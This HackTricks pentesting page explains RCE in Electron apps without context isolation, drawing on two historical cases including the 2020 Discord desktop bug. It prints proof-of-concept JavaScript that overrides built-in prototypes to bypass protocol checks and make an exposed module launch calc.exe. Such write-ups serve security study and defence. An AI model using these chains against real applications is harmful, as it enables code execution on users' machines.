---
title: "Electron contextIsolation RCE via preload code"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-preload-code.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

## Example 1

Example from [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)[\[1\]](#references)

This code open http(s) links with default browser:

In the affected historical application, a local-file navigation such as `file:///C:/Windows/System32/calc.exe` could reach an OS launch path; `SAFE_PROTOCOLS.indexOf` was intended to prevent it.

Therefore, an attacker could inject this JS code via the XSS or arbitrary page navigation:

```
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```
As the call to `SAFE_PROTOCOLS.indexOf` will return 1337 always, the attacker can bypass the protection and execute the calc. Final exploit:

```
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
Check the original slides for other ways to execute programs without having a prompt asking for permissions.[\[1\]](#references)

The historical Discord chain also considered UNC-style `file://127.0.0.1/electron/rce.jar` loading as another potential execution path; validate reachability on the exact Windows/Electron build.[\[2\]](#references)

## Example 2: Discord App RCE

Example from [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)[\[2\]](#references)

When checking the preload scripts, I found that Discord exposes the function, which allows some allowed modules to be called via `DiscordNative.nativeModules.requireModule('MODULE-NAME')`, into the web page.

Here, I couldn’t use modules that can be used for RCE directly, such as *child_process* module, but I **found a code where RCE can be achieved by overriding the JavaScript built-in methods** and interfering with the execution of the exposed module.

The following is the PoC. I was able to confirm that the **calc** application is **popped** up when I c**all the `getGPUDriverVersions` function** which is defined in the module called “*discord_utils*” from devTools, while **overriding the `RegExp.prototype.test` and `Array.prototype.join`**.

```
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```
The `getGPUDriverVersions` function tries to execute the program by using the “*execa*” library, like the following:

```
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }
  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`
  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }
  return result
}
```
Usually the *execa* tries to execute “*nvidia-smi.exe*”, which is specified in the `nvidiaSmiPath` variable, however, due to the overridden `RegExp.prototype.test` and `Array.prototype.join`, **the argument is replaced to “****calc****” in the _execa**_**’s internal processing**.

Specifically, the argument is replaced by influencing the command-resolution and argument-processing paths in the historical `cross-spawn` parser.[\[4\]](#references)

## References

- [1] [Electron: Abusing the lack of context isolation - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [Discord Desktop app RCE](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — Context isolation](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [`node-cross-spawn` parser revision and exact paths used by the chain (lines 36–55)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
